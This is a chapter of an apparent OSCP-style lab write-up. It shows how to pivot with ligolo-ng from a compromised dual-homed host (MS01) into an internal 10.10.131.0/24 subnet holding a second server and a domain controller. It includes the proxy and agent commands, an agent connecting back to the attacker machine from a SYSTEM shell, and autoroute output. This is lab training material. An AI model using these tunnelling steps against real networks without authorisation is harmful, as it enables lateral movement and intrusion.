# 10 — Pivot: ligolo-ng into `10.10.131.0/24`

The credential for DC01 is in hand, but the host is not routable. MS01 is dual-homed: Kali can
only see `192.168.131.147`, while MS02 and DC01 live on the internal `10.10.131.0/24`. This
chapter builds the route.

Pass 2 did not need this — DC01 answered directly at `10.10.152.140`. This pass has the
MS01-in-front shape, so the tunnel is back.

---

## 10.1 Proxy on Kali

```bash
cd /opt/Ligolo
sudo ligolo-proxy -laddr 0.0.0.0:9999 -selfcert
```

`-selfcert` generates a self-signed certificate for the relay. The binary is `ligolo-proxy` in
current releases; older builds call it `proxy`. The port is arbitrary, but it has to match the
agent's `-connect` address and be reachable from MS01.

---

## 10.2 Agent on MS01

From the SYSTEM shell, switch to PowerShell and run the staged agent:

```powershell
./agent -connect 192.168.45.158:9999 -ignore-cert
```

```
time="2026-11-25T21:05:57-08:00" level=warning msg="warning, certificate validation disabled"
time="2026-11-25T21:05:57-08:00" level=info msg="Connection established" addr="192.168.45.158:9999"
```

`-ignore-cert` is required because the proxy's certificate is self-signed. The agent runs in the
SYSTEM context, so the proxy identifies the session as the machine account:

```
ligolo-ng » session
? Specify a session : 1 - OSCP\MS01$@MS01 - 192.168.131.147:55016 - fa163e3be418
```

`OSCP\MS01$` is the machine account, not `eric.wallows` — SYSTEM processes authenticate to the
network as the computer. That name identifies the agent's context only: the tunnel is a relay for
Kali's own connections, and each protocol still authenticates with whatever credential is passed
to it.

---

## 10.3 Route

```
[Agent : OSCP\MS01$@MS01] » autoroute
? Select routes to add: 192.168.131.147/24, 10.10.131.147/24
? Create a new interface or use an existing one? Use an existing one
? Select the interface to use lab3 10.4.232.215/24, 172.16.232.254/24
INFO[0100] Interface lab3 configured (will be created on tunnel start)
INFO[0100] Creating routes for lab3...
? Start the tunnel? Yes
INFO[0102] Starting tunnel to OSCP\MS01$@MS01 (fa163e3be418)
[Agent : OSCP\MS01$@MS01] »
192.168.131.147 - done
```

`autoroute` proposes the subnets the agent can reach — here both of MS01's attached networks. The
tunnel is a tun interface on Kali, so `10.10.131.0/24` becomes a normal route: no `proxychains`
wrapper, and tools that cannot speak SOCKS work unchanged.

One caveat in the capture: `lab3` was already carrying `10.4.232.215/24` and `172.16.232.254/24`
from another lab. Reusing an interface that already has routes is a shortcut; on a busy host,
create a dedicated interface so `ip route` stays readable and a teardown does not strand unrelated
routes.

---

## 10.4 Result

| Route | Via | Reaches |
|---|---|---|
| `192.168.131.0/24` | `lab3` (ligolo) | MS01's external network |
| `10.10.131.0/24` | `lab3` (ligolo) | MS02 `10.10.131.148`, DC01 `10.10.131.146` |

The internal network is now directly addressable from Kali. The agent is still running on MS01;
the capture does not show it being stopped, and a real cleanup would remove it and tear the
interface down.

The next chapter points a scanner at MS02 through the tunnel.
